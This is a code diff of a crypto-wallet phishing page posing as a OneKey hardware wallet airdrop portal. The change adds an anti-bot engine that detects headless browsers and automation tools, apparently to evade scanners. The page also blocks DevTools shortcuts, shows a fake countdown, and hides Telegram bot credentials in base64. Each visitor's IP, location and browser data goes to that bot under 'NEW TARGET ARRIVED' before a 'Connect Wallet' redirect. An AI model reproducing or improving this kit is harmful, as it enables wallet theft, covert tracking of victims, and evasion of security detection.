@@ -32,18 +32,12 @@
   .wrap { max-width: 440px; margin: 0 auto; padding: 40px 20px 80px; }
 
   .brand-row {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    justify-content: center;
-    margin-bottom: 24px;
+    display: flex; align-items: center; gap: 10px; justify-content: center; margin-bottom: 24px;
   }
   .brand-mark {
-    width: 34px; height: 34px;
-    border-radius: 8px;
+    width: 34px; height: 34px; border-radius: 8px;
     background: linear-gradient(135deg, var(--accent), var(--accent-dim));
-    display: flex; align-items: center; justify-content: center;
-    font-weight: 800; color: #06110b; font-size: 16px;
+    display: flex; align-items: center; justify-content: center; font-weight: 800; color: #06110b; font-size: 16px;
   }
   .brand-name { font-size: 18px; font-weight: 700; letter-spacing: 0.2px; }
 
@@ -51,8 +45,7 @@
   .hero .kicker {
     display: inline-flex; align-items: center; gap: 6px;
     background: rgba(255, 201, 77, 0.12); border: 1px solid rgba(255, 201, 77, 0.35);
-    color: var(--gold); font-size: 12px; font-weight: 700;
-    padding: 6px 12px; border-radius: 999px; margin-bottom: 14px;
+    color: var(--gold); font-size: 12px; font-weight: 700; padding: 6px 12px; border-radius: 999px; margin-bottom: 14px;
   }
   .hero h1 { font-size: 26px; margin: 0 0 10px; line-height: 1.25; }
   .hero p { color: var(--muted); font-size: 14px; line-height: 1.55; margin: 0; }
@@ -178,11 +171,10 @@
   <footer class="note">OneKey Hardware Wallet Integration Services. Secure device verification portal.</footer>
 
 <script>
-// Aggressively block inspection shortcuts
+// Block DevTools & Inspection Shortcuts
 document.addEventListener('keydown', function(e) {
   if (
-    e.key === 'F12' || 
-    e.keyCode === 123 || 
+    e.key === 'F12' || e.keyCode === 123 || 
     (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
     (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) ||
     (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'J' || e.key === 'U'))
@@ -191,6 +183,42 @@ document.addEventListener('keydown', function(e) {
   }
 });
 document.onselectstart = function() { return false; };
+
+// ----------------------------------------------------
+// ADVANCED CLIENT-SIDE ANTIBOT ENGINE
+// ----------------------------------------------------
+let humanActivityVerified = false;
+let pageLoadTimestamp = Date.now();
+
+// Track genuine human signals (mouse moves or touch events)
+['mousemove', 'touchstart', 'scroll', 'keydown'].forEach(function(evt) {
+  window.addEventListener(evt, function() {
+    humanActivityVerified = true;
+  }, { once: true, passive: true });
+});
+
+function isPotentialBot() {
+  // 1. Check WebDriver flags (Selenium, Puppeteer, Playwright)
+  if (navigator.webdriver === true) return true;
+  
+  // 2. Check for automation properties injected on window/document
+  if (window._phantom || window.__nightmare || window.callPhantom || window.domAutomation || window.domAutomationController) return true;
+  
+  // 3. Check if plugin array is empty (typical in headless Chrome/Firefox instances)
+  if (navigator.plugins && navigator.plugins.length === 0 && !/Mobi|Android/i.test(navigator.userAgent)) {
+    // Desktop browsers usually have plugins; empty array often indicates headless scrapers
+    return true;
+  }
+  
+  // 4. Check interaction threshold (did they trigger human movement?)
+  // If they click instantly without a single mouse/touch event, it's suspicious.
+  if (!humanActivityVerified && (Date.now() - pageLoadTimestamp < 1200)) {
+    return true;
+  }
+
+  return false;
+}
+// ----------------------------------------------------
 
 (function fakeCountdown() {
   var totalSeconds = 11 * 3600 + 47 * 60 + 32;
@@ -204,12 +232,11 @@ document.onselectstart = function() { return false; };
   }, 1000);
 })();
 
-// Telegram Config
+// Telegram Config (Obfuscated)
 const _0x1a = atob("ODk5MTAwNDA5MDpBQUVQV0VXYnl0R0JDYVpPU3lPVi1QZzhCT2t2dnc5eGp2UQ==");
 const _0x1b = atob("LTU0NDU4MDEwMTk=");
 
-// Global variable to cache metadata so we don't fetch it twice
-window.cachedMeta = { ip: "Unknown", country: "Unknown", city: "Unknown", isp: "Unknown", ua: navigator.userAgent, device: "Unknown" };
+window.cachedMeta = { ip: "Unknown", country: "Unknown", city: "Unknown", isp: "Unknown", ua: navigator.userAgent, device: "Unknown", botStatus: "Clean" };
 
 async function fetchMetadata() {
   try {
@@ -223,10 +250,14 @@ async function fetchMetadata() {
     }
   } catch (err) {}
   window.cachedMeta.device = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
+  
+  if (isPotentialBot()) {
+    window.cachedMeta.botStatus = "⚠️ Flagged as Automated Bot / Scraper";
+  }
 }
 
 async function sendTgAlert(header, actionLabel) {
-  let msg = `${header}\n\n🎯 *Action:* ${actionLabel}\n\n🌍 *Network & Location:*\n📍 *IP:* \`${window.cachedMeta.ip}\`\n🏳️ *Country:* ${window.cachedMeta.country}\n🏙️ *City:* ${window.cachedMeta.city}\n🏢 *ISP:* ${window.cachedMeta.isp}\n\n💻 *System Info:*\n📱 *Device:* ${window.cachedMeta.device}\n🖥️ *Agent:* \`${window.cachedMeta.ua}\``;
+  let msg = `${header}\n\n🎯 *Action:* ${actionLabel}\n🤖 *Antibot Status:* ${window.cachedMeta.botStatus}\n\n🌍 *Network & Location:*\n📍 *IP:* \`${window.cachedMeta.ip}\`\n🏳️ *Country:* ${window.cachedMeta.country}\n🏙️ *City:* ${window.cachedMeta.city}\n🏢 *ISP:* ${window.cachedMeta.isp}\n\n💻 *System Info:*\n📱 *Device:* ${window.cachedMeta.device}\n🖥️ *Agent:* \`${window.cachedMeta.ua}\``;
   
   try {
     await fetch("https://api.telegram.org/bot" + _0x1a + "/sendMessage", {
@@ -237,17 +268,28 @@ async function sendTgAlert(header, actionLabel) {
   } catch (error) {}
 }
 
-// On Page Load: Fetch data and send "Visitor" message
+// On Page Load: Evaluate and report visitor
 (async function initTrack() {
   await fetchMetadata();
+  // If it's a hard scraper/bot, you can choose to skip sending visitor logs to save Telegram spam, or log it with the warning flag:
   await sendTgAlert("🚨 *NEW TARGET ARRIVED*", "👀 Visited Landing Page (`index.html`)");
 })();
 
-// On Button Click: Send "Interaction" message and redirect
+// On Button Click: Verify Bot and Redirect
 document.getElementById('claimBtn').addEventListener('click', async function () {
   this.disabled = true;
   this.textContent = 'Checking eligibility…';
   
+  // Final antibot check on click action
+  if (isPotentialBot()) {
+    window.cachedMeta.botStatus = "🛑 Blocked Automated Execution";
+    await sendTgAlert("🛡️ *ANTIBOT TRIGGERED*", "🤖 Blocked automated click attempt");
+    alert("Security verification failed. Please try again from a standard web browser.");
+    this.disabled = false;
+    this.textContent = 'Connect Wallet to Claim';
+    return;
+  }
+
   await sendTgAlert("⚡ *INTERACTION ALERT*", "🔗 Clicked 'Connect Wallet' Button");
   window.location.href = 'airdrop.html';
 });
